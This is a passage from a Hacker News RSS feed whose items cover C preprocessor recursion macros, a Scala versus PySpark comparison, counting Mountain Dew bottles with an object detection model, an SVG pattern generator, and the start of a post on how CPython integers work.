#define EXPAND(...) __VA_ARGS__
#define WHEN(c) IF(c)(EXPAND, EAT)
</code></pre></div></div>

<p>Now with all these macros we can write a recursive <code>REPEAT</code> macro. We use a <code>REPEAT_INDIRECT</code> macro to refer back to itself recursively. This prevents the macro from being painted blue, since it will expand on a different scan(and using a different disabling context). We use <code>OBSTRUCT</code> here, which will defer the expansion twice. This is necessary because the conditional <code>WHEN</code> applies one scan already.</p>

<div><div><pre><code>#define REPEAT(count, macro, ...) \
    WHEN(count) \
    ( \
        OBSTRUCT(REPEAT_INDIRECT) () \
        ( \
            DEC(count), macro, __VA_ARGS__ \
        ) \
        OBSTRUCT(macro) \
        ( \
            DEC(count), __VA_ARGS__ \
        ) \
    )
#define REPEAT_INDIRECT() REPEAT

//An example of using this macro
#define M(i, _) i
EVAL(REPEAT(8, M, ~)) // 0 1 2 3 4 5 6 7
</code></pre></div></div>

<p>Now this example is limited to 10 repeats, because of limitations of the counter. Just like a repeat counter in a computer would be limited by the finite memory. Multiple repeat counters could be combined together to workaround this limitation, just like in a computer. Furthermore, we could define a <code>FOREVER</code> macro:</p>

<div><div><pre><code>#define FOREVER() \
    ? \
    DEFER(FOREVER_INDIRECT) () ()
#define FOREVER_INDIRECT() FOREVER
// Outputs question marks forever
EVAL(FOREVER())
</code></pre></div></div>

<p>This will try to output <code>?</code> forever, but will eventually stop because there are no more scans being applied. Now the question is, if we gave it an infinite number of scans would this algorithm complete? This is known as the halting problem, and Turing completeness is necessary to prove the undecidability of the halting problem. So as you can see, the preprocessor can act as a Turing complete language, but instead of being limited to the finite memory of a computer it is instead limited by the finite number of scans applied.</p>

  </article></div>]]>
            </description>
            <link>https://pfultz2.com/blog/2012/05/10/turing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26067439</guid>
            <pubDate>Mon, 08 Feb 2021 17:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reminder: Terraria Dev’s Google Story Is Not Unusual at All]]>
            </title>
            <description>
<![CDATA[
Score 311 | Comments 8 (<a href="https://news.ycombinator.com/item?id=26067188">thread link</a>) | @teddyh
<br/>
February 8, 2021 | https://codewriteplay.com/2021/02/08/reminder-terraria-devs-google-story-is-not-unusual-at-all/ | <a href="https://web.archive.org/web/*/https://codewriteplay.com/2021/02/08/reminder-terraria-devs-google-story-is-not-unusual-at-all/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://codewriteplay.com/2021/02/08/reminder-terraria-devs-google-story-is-not-unusual-at-all/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26067188</guid>
            <pubDate>Mon, 08 Feb 2021 17:08:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scala Spark vs. Python PySpark: Which Is Better?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26067099">thread link</a>) | @MrPowers
<br/>
February 8, 2021 | https://mungingdata.com/apache-spark/python-pyspark-scala-which-better/ | <a href="https://web.archive.org/web/*/https://mungingdata.com/apache-spark/python-pyspark-scala-which-better/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-414" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">

	
		<!-- .entry-header -->

		<div itemprop="articleBody">
			
<p>Apache Spark code can be written with the Scala, Java, Python, or R APIs.</p>



<p>Scala and Python are the most popular APIs. This blog post performs a detailed comparison of writing Spark with Scala and Python and helps users choose the language API that’s best for their team.</p>



<p>Both language APIs are great options for most workflows. Spark lets you write elegant code to run jobs on massive datasets – it’s an amazing technology.</p>



<p>Choosing the right language API is an important decision. It’s hard to switch once you develop core libraries with one language.</p>



<p>Making the right choice is difficult because of common misconceptions like “Scala is 10x faster than Python”, which are completely misleading when comparing Scala Spark and PySpark.</p>



<p>TL;DR:</p>



<ul><li>PySpark used to be buggy and poorly supported, but that’s not true anymore. Python is a first class citizen in Spark. PySpark is a great option for most workflows.</li><li>More people are familiar with Python, so PySpark is naturally their first choice when using Spark.</li><li>Many programmers are terrified of Scala because of its reputation as a super-complex language. They don’t know that Spark code can be written with basic Scala language features that you can learn in a day. You don’t need to “learn Scala” or “learn functional programming” to write Spark code with Scala. You can stick to basic language features like <code>if</code>, <code>class</code>, and <code>object</code>, write code that looks exactly like Python, and enjoy the benefits of the Scala ecosystem.</li><li>Scala is a compile-time, type-safe language, so it offers certain features that cannot be offered in PySpark, like Datasets. Compile time checks give an awesome developer experience when working with an IDE like IntelliJ.</li><li>A lot of the Scala advantages don’t matter in the Databricks notebook environment. Notebooks don’t support features offered by IDEs or production grade code packagers, so if you’re going to strictly work with notebooks, don’t expect to benefit from Scala’s advantages.</li><li>Python has great libraries, but most are not performant / unusable when run on a Spark cluster, so Python’s “great library ecosystem” argument doesn’t apply to PySpark (unless you’re talking about libraries that you know are performant when run on clusters).</li></ul>



<p>Let’s dig into the details and look at code to make the comparison more concrete.</p>



<h2>Chaining DataFrame transformations</h2>



<p>This section demonstrates how the <code>transform</code> method can elegantly invoke Scala functions (because functions can take two parameter lists) and isn’t quite as easy with Python.</p>



<p>Custom transformations are a great way to package Spark code. They’re easily reusable and can be composed for different analyses. They’re also easily testable as standalone units.</p>



<p>Suppose you have the following DataFrame.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+
| country|
+--------+
|  brasil|
|colombia|
|    null|
+--------+</pre>



<p>Here’s a Scala function that’ll append some text to the <code>country</code> column:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def funify(colName: String, str: String)(df: DataFrame): DataFrame = {
  df.withColumn("funified", concat(col(colName), lit(" "), lit(str)))
}</pre>



<p>Here’s how to invoke the Scala function with the <code>Dataset#transform</code> method:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">df
  .transform(funify("country", "is awesome"))
  .show()</pre>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+-------------------+
| country|           funified|
+--------+-------------------+
|  brasil|  brasil is awesome|
|colombia|colombia is awesome|
|    null|               null|
+--------+-------------------+</pre>



<p>Notice how the <code>funify</code> function is defined with two parameter lists and invoked with one set of arguments. The Scala programming language allows for this elegant syntax.</p>



<p>Here’s an equivalent PySpark function that’ll append to the <code>country</code> column:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pyspark.sql.functions import col, lit, concat

def funify(col_name, str):
    def _(df):
        return df.withColumn("funified", concat(col(col_name), lit(" "), lit(str)))
    return _</pre>



<p>Here’s how to invoke the Python function with <code>DataFrame#transform</code>:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">df.transform(funify("country", "is super fun!")).show(truncate=False)</pre>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+----------------------+
|country |funified              |
+--------+----------------------+
|colombia|colombia is super fun!|
|brasil  |brasil is super fun!  |
|null    |null                  |
+--------+----------------------+</pre>



<p>There are <a href="https://mungingdata.com/pyspark/chaining-dataframe-transformations/">a lot of different ways to define custom PySpark transformations</a>, but nested functions seem to be the most popular.</p>



<p>Nested functions aren’t the best. They create an extra level of indentation and require two return statements, which are easy to forget. The comparative difficulty of chaining PySpark custom transformations is a downside.</p>



<h2>Datasets vs DataFrames</h2>



<p>Datasets can only be implemented in languages that are compile-time type-safe. Java and Scala are compile-time type-safe, so they support Datasets, but Python and R are not compile-time type-safe, so they only support DataFrames.</p>



<p>Datasets so useful in practice.</p>



<ul><li>It’s easy to perform operations <a href="https://mungingdata.com/apache-spark/dataset-tods-createdataset-advantages/">that’ll convert a Dataset to a DataFrame</a> (e.g. adding a column).</li><li>Datasets <a href="https://stackoverflow.com/questions/40596638/spark-2-0-dataset-vs-dataframe/40602882#40602882">are less performant</a> although <a href="https://izeigerman.medium.com/making-the-spark-dataframe-composition-type-safe-r-7b6fed524ec2">the performance gap is supposedly narrowing</a></li><li><a href="https://github.com/typelevel/frameless/">Expressively typed Datasets</a> sound promising, but <a href="https://mungingdata.com/apache-spark/frameless-typed-datasets/">aren’t practical yet</a></li></ul>



<p>Datasets shouldn’t be considered to be a huge advantage because most Scala programmers use DataFrames anyways.</p>



<h2>Feature parity</h2>



<p>PySpark generally supports all the features in Scala Spark, with a few exceptions.</p>



<p>The <code>CalendarIntervalType</code> has been in the Scala API since Spark 1.5, but still isn’t in the PySpark API as of Spark 3.0.1. This is a “serious loss of function” and <a href="https://github.com/apache/spark/pull/29935">will hopefully get added</a>.</p>



<p>In general, both the Python and Scala APIs support the same functionality. Spark knows that a lot of users avoid Scala/Java like the plague and they need to provide excellent Python support.</p>



<h2>Performance comparison</h2>



<p>Scala and PySpark should perform relatively equally for DataFrame operations.</p>



<p><a href="https://stackoverflow.com/questions/32464122/spark-performance-for-scala-vs-python">This thread</a> has a dated performance comparison.</p>



<p><a href="https://news.ycombinator.com/item?id=26030970">“Regular” Scala code can run 10-20x faster than “regular” Python code</a>, but that PySpark isn’t executed liked like regular Python code, so this performance comparison isn’t relevant.</p>



<p>PySpark is converted to Spark SQL and then executed on a JVM cluster. It’s not a traditional Python execution environment. Benchmarks for other Python execution environments are irrelevant for PySpark.</p>



<p>Watch out! Some other blog posts imply that PySpark is 10x slower which just isn’t true.</p>



<h2>Code editing</h2>



<p>The IntelliJ community edition provides a powerful Scala integrated development environment with out of the box. If provides you with code navigation, type hints, function completion, and compile-time runtime error reporting.</p>



<p>There’s also a <a href="https://scalameta.org/metals/">Metals</a> project that allows for IDE-like text editor features in Vim or VSCode. Use IntelliJ if you’d like a full-serviced solution that works out of the box. Metals is good for those who enjoy text editor tinkering and custom setups.</p>



<p>Scala provides excellent text editors for working with Spark.</p>



<p>Some folks develop Scala code without the help of either Metals or IntelliJ, which puts you at a disadvantage. Scala IDEs give you a lot of help for free. Scala devs that reject free help from their text editor will suffer unnecessarily.</p>



<p>PyCharm doesn’t work out of the box with PySpark, <a href="https://stackoverflow.com/questions/34685905/how-to-link-pycharm-with-pyspark">you need to configure it</a>. <a href="https://github.com/zero323/pyspark-stubs">pyspark-stubs</a> provide some nice error messages and autocompletion, but nothing compared to what’s offered by Scala/IntelliJ.</p>



<p>Scala has the edge for the code editor battle.</p>



<h2>Compile time exceptions</h2>



<p>Here’s what IntelliJ will show when you try to invoke a Spark method without enough arguments.</p>



<figure><img loading="lazy" width="1024" height="148" src="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.12.54-AM-1024x148.png" alt="" srcset="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.12.54-AM-1024x148.png 1024w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.12.54-AM-300x43.png 300w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.12.54-AM-768x111.png 768w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.12.54-AM.png 1026w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The PyCharm error only shows up when pyspark-stubs is included and is more subtle.</p>



<figure><img loading="lazy" width="916" height="64" src="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM.png" alt="" srcset="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM.png 916w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM-300x21.png 300w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM-768x54.png 768w" sizes="(max-width: 916px) 100vw, 916px"></figure>



<p>At least you can hover over the method and get a descriptive hint.</p>



<figure><img loading="lazy" width="1024" height="384" src="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1024x384.png" alt="" srcset="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1024x384.png 1024w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-300x113.png 300w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-768x288.png 768w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1025x384.png 1025w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM.png 1120w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h2>Code navigation</h2>



<p>IntelliJ/Scala let you easily navigate from your code directly to the relevant parts of the underlying Spark code. Suppose your cursor is on the <code>regexp_extract</code> function. You can pretty Command + b to go directly to <code>org.apache.spark.sql.functions.regexp_extract</code> and then continue pressing Command + b to see exactly how the function is working under the hood.</p>



<p>PySpark code navigation is severely lacking in comparison. You can navigate to functions within your codebase, but you’ll be directed to the stub file if you try to jump to the underlying PySpark implementations of core functions.</p>



<p>PySpark code navigation can’t be as good due to Python language limitations.</p>



<h2>Packaging JARs vs Wheels</h2>



<p>Scala projects can be packaged as JAR files and uploaded to Spark execution environments like Databricks or EMR where the functions are invoked in production. JAR files can be assembled without dependencies (thin JAR files) or with dependencies (fat JAR files). Scala makes it easy to customize your fat JAR files to exclude the test dependencies, exclude Spark (because that’s already included by your runtime), and contain other project dependencies. See <a href="https://mungingdata.com/apache-spark/building-jar-sbt/">this blog</a> for more on building JAR files.</p>



<p>You can even overwrite the packages for the dependencies in fat JAR files to avoid namespace conflicts by leveraging a process called shading.</p>



<p>Suppose <code>com.your.org.projectXYZ</code> depends on <code>com.your.org.projectABC</code> and you’d like to attach <code>projectXYZ</code> to a cluster as a fat JAR file. You’d like <code>projectXYZ</code> to use version 1 of <code>projectABC</code>, but would also like to attach version 2 of <code>projectABC</code> separately. When <code>projectXYZ</code> calls <code>com.your.org.projectABC.someFunction</code>, it should use version 1. All other invocations of <code>com.your.org.projectABC.someFunction</code> should use version 2.</p>



<p>You can shade <code>projectABC</code> in the <code>projectXYZ</code> fat JAR file, so the path is something like <code>projectAbcShaded.projectABC</code>, to prevent namespace conflicts for when <code>projectABC</code> version 2 is attached to the cluster. See <a href="https://mungingdata.com/apache-spark/shading-dependencies-with-sbt/">here</a> for more details on shading.</p>



<p>Shading is a great technique to avoid dependency conflicts and dependency hell.</p>



<p>Python doesn’t support building fat wheel files or shading dependencies. This <a href="https://databricks.com/blog/2020/12/22/how-to-manage-python-dependencies-in-pyspark.html">blog post</a> explains some of …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mungingdata.com/apache-spark/python-pyspark-scala-which-better/">https://mungingdata.com/apache-spark/python-pyspark-scala-which-better/</a></em></p>]]>
            </description>
            <link>https://mungingdata.com/apache-spark/python-pyspark-scala-which-better/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26067099</guid>
            <pubDate>Mon, 08 Feb 2021 17:01:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using computer vision to help win $1M in Mountain Dew's Super Bowl contest]]>
            </title>
            <description>
<![CDATA[
Score 218 | Comments 85 (<a href="https://news.ycombinator.com/item?id=26066970">thread link</a>) | @rocauc
<br/>
February 8, 2021 | https://blog.roboflow.com/mountain-dew-contest-computer-vision/ | <a href="https://web.archive.org/web/*/https://blog.roboflow.com/mountain-dew-contest-computer-vision/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                <div><p>Last night during Super Bowl LV, Mountain Dew ran an ad featuring John Cena riding through a Mountain Dew-themed amusement park. Bottles are scattered all over the scene: neon signs on buildings, in fun house mirrors, and flying out of the car trunk.</p><p>At the end of the ad, John Cena challenges the audience: <strong>The first person to tweet at Mountain Dew the exact number of bottles that appear in the commercial is eligible to win $1 million.</strong></p><p>Watch the ad for yourself here:</p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/9cEiYQwYLPk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>When we heard that a task called for careful visual inspection and counting, we knew <a href="https://blog.roboflow.com/intro-to-computer-vision/">computer vision</a> would be a helpful tool. So, we did what any developer would do: trained an <a href="https://models.roboflow.com/object-detection">object detection model</a> to recognize bottles that appear throughout the scene. </p><figure><img src="https://blog.roboflow.com/content/images/2021/02/Winning_1_Million_with_Computer_Vision_Mountain_Dew_Super_Bowl_Contest.gif" alt="Counting Mountain Dew Contest with Computer Vision"><figcaption>A three-second example of the model finding Mountain Dew bottles in the scene.</figcaption></figure><p>In this case, <strong>we're using a <a href="https://models.roboflow.com/">computer vision model</a> to help us find any bottles we may have otherwise missed.</strong> The viewer should still identify the unique occurrences of each bottle across the scene when tweeting a submission.</p><p>Per the <a href="https://www.lifechangingdew.com/rules">Official Rules</a>, any type of bottle counts – but each bottle should only be counted once. (For example, the bottle in the car John Cena drinks from is present multiple different times, but it should only be counted once towards the tally.) </p><p>Let's dive in.</p><h3 id="preparing-a-dataset">Preparing a Dataset</h3><p>First, we need a dataset of images from the ad. In this case, we can grab the exact video file of the commercial. We'll need to <a href="https://blog.roboflow.com/using-video-computer-vision/">split the video file into individual image frames</a> in order to annotate the images and train a model.</p><p>I created a dataset and dropped the Mountain Dew video into Roboflow, which asks what frame rate I'd like to sample. I decided on doing three frames per second, which creates 92 images from the roughly 30-second Super Bowl spot.</p><figure><img src="https://blog.roboflow.com/content/images/2021/02/Winning_1_Million_with_Computer_Vision_Mountain_Dew_Super_Bowl_Contest-upload.gif" alt="Turning video into images for computer vision."><figcaption>Selecting a three frames per second rate for the commercial.</figcaption></figure><p>Having each of the individual frames from the video is independently helpful: it means we can have a closer look at all of the places where the Mountain Dew bottles may be present.</p><p>Once we have these images, we need to <a href="https://docs.roboflow.com/annotate">annotate</a> all of the bottles we can find in each of the scenes. While this is fairly similar to counting all of the bottles manually, remember we might not be perfect in finding all of the bottles with our own eyes. So, hopefully, in teaching a computer vision model what bottles look like and then asking that same model to find bottles for us, we'll see any we may have missed.</p><figure><img src="https://blog.roboflow.com/content/images/2021/02/annotating-bottles.png" alt="Labeling bottles for computer vision" srcset="https://blog.roboflow.com/content/images/size/w600/2021/02/annotating-bottles.png 600w, https://blog.roboflow.com/content/images/size/w1000/2021/02/annotating-bottles.png 1000w, https://blog.roboflow.com/content/images/2021/02/annotating-bottles.png 1573w" sizes="(min-width: 720px) 720px"><figcaption>Annotating all of the Mountain Dew bottles in each of our images.</figcaption></figure><p>After labeling (and deleting one completely black image from the vid), we have 869 annotations across 91 images. We've open sourced this final <a href="https://public.roboflow.com/object-detection/mountain-dew-commercial">Mountain Dew bottles image dataset</a>:</p><figure><a href="https://public.roboflow.com/object-detection/mountain-dew-commercial"><div><p>Mountain Dew Commercial Object Detection Dataset</p><p># Overview ## Mountain Dew is running a $1,000,000 counting contest. Computer Vision can help you win.:fa-spacer: ### Watch [our video](https://youtu.be/jqVKdMjPXHA) explaining how to use this dataset. ![Mountain Dew](https://i.imgur.com/ED4jpM3.png…</p></div><p><img src="https://storage.googleapis.com/roboflow-platform-sources/Ly2DeBzbwsemGd2ReHk4BFxy8683/WF57VFawbh9kJl5K4fie/original.jpg"></p></a></figure><h3 id="training-an-object-detection-model">Training an Object Detection Model</h3><p>Once we have our images collected and labeled, we can train a model to find bottles for us. Before training, however, we can use <a href="https://blog.roboflow.com/boosting-image-detection-performance-with-data-augmentation/">image augmentation</a> to increase the size of our training dataset.</p><p>By applying random distortions like <a href="https://docs.roboflow.com/image-transformations/image-augmentation">brightness changes</a>, <a href="https://blog.roboflow.com/why-and-how-to-implement-random-rotate-data-augmentation/">perspective changes</a>, <a href="https://blog.roboflow.com/how-flip-augmentation-improves-model-performance/">flips</a>, and more, we can increase the volume and variability of our training dataset so that our model has more examples to learn from.</p><figure><div><div><p><img src="https://blog.roboflow.com/content/images/2021/02/dew-aug1.png" width="760" height="760" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/02/dew-aug1.png 600w, https://blog.roboflow.com/content/images/2021/02/dew-aug1.png 760w" sizes="(min-width: 720px) 720px"></p><p><img src="https://blog.roboflow.com/content/images/2021/02/dew-aug2.png" width="818" height="818" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/02/dew-aug2.png 600w, https://blog.roboflow.com/content/images/2021/02/dew-aug2.png 818w" sizes="(min-width: 720px) 720px"></p></div><div><p><img src="https://blog.roboflow.com/content/images/2021/02/dew-aug3.png" width="820" height="818" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/02/dew-aug3.png 600w, https://blog.roboflow.com/content/images/2021/02/dew-aug3.png 820w" sizes="(min-width: 720px) 720px"></p><p><img src="https://blog.roboflow.com/content/images/2021/02/dew-aug4.png" width="821" height="817" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/02/dew-aug4.png 600w, https://blog.roboflow.com/content/images/2021/02/dew-aug4.png 821w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>Our <a href="https://docs.roboflow.com/image-transformations/image-augmentation">augmented images</a> have been brightened, sheared, flipped, rotated, and more to increase dataset size and variability.</figcaption></figure><p>We then made use of <a href="https://docs.roboflow.com/train">Roboflow Train</a>, which gives us the option to one-click have a trained model available. Critically, when starting model training, we can start from a previous model checkpoint. This <a href="https://blog.roboflow.com/a-primer-on-transfer-learning/">transfer learning</a> will accelerate model training and improve model accuracy. For this dataset, starting training from the <a href="https://blog.roboflow.com/coco-dataset/">COCO Dataset</a> (a dataset of "Common Objects in Context") will give the model a healthy head start.</p><figure><img src="https://blog.roboflow.com/content/images/2021/02/roboflow-train-results.png" alt="Roboflow Train results"><figcaption>The results of our model training. 89.5% <a href="https://blog.roboflow.com/mean-average-precision/">mean average precision</a>. Not bad!</figcaption></figure><h3 id="using-our-model">Using Our Model</h3><p>Once the model finishes training, we have an <a href="https://blog.roboflow.com/hands-on-with-the-roboflow-infer-web-application-interface/">API</a> we can call to perform detections on our original video. With a little shell scripting, we can passthrough the original commercial video frame-by-frame and reconstruct the result with the bounding boxes present.</p><p>The result? See for yourself:</p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/jqVKdMjPXHA?start=773&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>A full video walkthrough of our process. The resulting video is available at the 12:53 mark.</figcaption></figure><p>Good luck! We hope you win that $1 million.</p></div>
                
              </div>
            </div></div>]]>
            </description>
            <link>https://blog.roboflow.com/mountain-dew-contest-computer-vision/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26066970</guid>
            <pubDate>Mon, 08 Feb 2021 16:52:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An online detector for GAN-generated faces]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26066783">thread link</a>) | @giorgiop
<br/>
February 8, 2021 | https://platform.sensity.ai/deepfake-detection | <a href="https://web.archive.org/web/*/https://platform.sensity.ai/deepfake-detection">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://platform.sensity.ai/deepfake-detection</link>
            <guid isPermaLink="false">hacker-news-small-sites-26066783</guid>
            <pubDate>Mon, 08 Feb 2021 16:40:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: SVG Pattern Generator – Geometric seamless patterns for the web]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26066335">thread link</a>) | @visiwig
<br/>
February 8, 2021 | https://www.visiwig.com/patterns/ | <a href="https://web.archive.org/web/*/https://www.visiwig.com/patterns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="CONTENT">
		
		<main id="swup">					
						
			<div>					
	
	


	<section id="PATTERNS">
		<div id="pttnSTAGE">
			
						
			<div id="pttnMENU">
				<div id="pttnINPUT">
					<p><label id="labelPttnScale" for="inputPttnScale">Scale: 1</label>
						
					</p>
					<p><label id="labelPttnRotate" for="inputPttnRotate">Rotation: 0</label>
						
					</p>
					<p><label id="labelPttnStroke" for="inputPttnStroke">Stroke Width: 0</label>
						
					</p>
					<div id="input-pttn-color">
						
						<p>
							MODE: &nbsp;
								
							
						</p>
					</div>
					<div id="input-pttn-preview">
						<p>You can use the patterns in any project, commercial or personal without attribution or any costs, but you can’t replicate Visiwig's patterns, redistribute the patterns in packs, or create integrations for these patterns.</p>
						<p><a href="https://www.visiwig.com/pattern-license">FULL LICENSE</a>
					</p></div>
					
				</div>
				</div>		
		</div>
		<div>	
			
			<p>Customize seamless patterns and export for the web or your favorite vector software</p>
			
						
			<div id="pttnPromo">
				<div><p><a href="https://www.visiwig.com/product/100-essential-geometric-and-minimalist-patterns/">PREVIEW ALL 100 PATTERNS</a></p></div>			</div>			
		</div>		
	</section>

			</div> <!-- </.swup-wrap> -->
		</main>		
		
		</div></div>]]>
            </description>
            <link>https://www.visiwig.com/patterns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26066335</guid>
            <pubDate>Mon, 08 Feb 2021 16:08:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Python Integers Work]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26066300">thread link</a>) | @__henil
<br/>
February 8, 2021 | https://tenthousandmeters.com/blog/python-behind-the-scenes-8-how-python-integers-work/ | <a href="https://web.archive.org/web/*/https://tenthousandmeters.com/blog/python-behind-the-scenes-8-how-python-integers-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>In the previous parts of this series we studied the core of the CPython interpreter and saw how the most fundamental aspects of Python are implemented. We made an overview of <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">the CPython VM</a>, took a look at <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">the CPython compiler</a>, stepped through <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-3-stepping-through-the-cpython-source-code/">the CPython source code</a>, studied <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">how the VM executes the bytecode</a> and learned <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-5-how-variables-are-implemented-in-cpython/">how variables work</a>. In the two most recent posts we focused on <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-6-how-python-object-system-works/">the Python object system</a>. We learned what Python objects and Python types are, how they are defined and what determines their behavior. This discussion gave us a good understanding of how Python objects work in general. What we haven't discussed is how particular objects, such as strings, integers and lists, are implemented. In this and several upcoming posts we'll cover the implementations of the most important and most interesting built-in types. The subject of today's post is <code>int</code>.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h2>Why Python integers are interesting</h2>
<p>Integers require no introduction. They are so ubiquitous and seem so basic that you may doubt whether it's worth discussing how they are implemented at all. Yet, Python integers are interesting because they are not just 32-bit or 64-bit integers that CPUs work with natively. Python integers are <a href="https://en.wikipedia.org/wiki/Arbitrary-precision_arithmetic">arbitrary-precision integers</a>, also known as bignums. This means that they can be as large as we want, and their sizes are only limited by the amount of available memory.</p>
<p>Bignums are handy to work with because we don't need to worry about such things as integer overflows and underflows. They are extensively used in fields like cryptography and computer algebra where large numbers arise all the time and must be represented precisely. So, <a href="https://en.wikipedia.org/wiki/List_of_arbitrary-precision_arithmetic_software">many</a> programming languages have bignums built-in. These include Python, JavaScript, Ruby, Haskell, Erlang, Julia, Racket. Others provide bignums as a part of the standard library. These include Go, Java, C#, D, PHP. Numerous third-party libraries implement bignums. The most popular one is <a href="https://en.wikipedia.org/wiki/GNU_Multiple_Precision_Arithmetic_Library">the GNU Multiple Precision Arithmetic Library</a> (GMP). It provides a C API but has bindings for all major languages.</p>
<p>There are a lot of bignum implementations. They're different in detail, but the general approach to implement bignums is the same. Today we'll see what this approach looks like and use CPython's implementation as a reference example. The two main questions we'll have to answer are:</p>
<ul>
<li>how to represent bignums; and</li>
<li>how to performs arithmetic operations, such as addition and multiplication, on bignums.</li>
</ul>
<p>We'll also discuss how CPython's implementation compares to others and what CPython does to make integers more efficient. </p>
<h2>Bignum representation</h2>
